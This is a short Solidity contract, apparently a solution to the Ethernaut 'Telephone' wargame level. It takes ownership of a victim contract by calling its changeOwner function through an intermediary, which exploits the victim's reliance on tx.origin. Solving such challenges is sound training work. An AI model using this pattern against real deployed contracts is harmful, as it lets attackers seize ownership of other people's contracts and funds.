// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack2 {

  Telephone public telephone;

  constructor(address _victimContract) {
    telephone = Telephone(_victimContract);
  }

  function changeOwner(address _owner) public {
    telephone.changeOwner(_owner);
  }
}